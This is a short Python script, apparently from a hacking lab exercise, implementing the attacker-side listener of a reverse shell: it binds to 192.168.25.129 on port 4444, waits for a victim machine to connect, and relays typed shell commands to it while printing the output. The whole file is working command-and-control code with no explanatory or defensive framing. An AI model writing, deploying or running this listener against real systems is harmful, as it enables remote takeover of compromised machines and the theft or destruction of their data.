#!/usr/bin/env python

import socket
import subprocess

def execute_system_command(command):
    subprocess.call(command)


class Listener :
    def __init__(self, ip , port ):
        # Set up the listener socket
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)

        # Wait for the connection
        self.connection, self.address = listener.accept()
        print(f"[+] Connection established with {str(self.address)}")
    def execute_remotely(self,command):
        self.connection.send(command)
        return self.connection.recv(1024)
    def run(self):
        while True:
            command = input("$ ")        
            command_bytes = command.encode("utf-8")
            result = self.execute_remotely(command_bytes) 
            print(result.decode('utf-8'))
my_listener = Listener("192.168.25.129", 4444)
my_listener.run()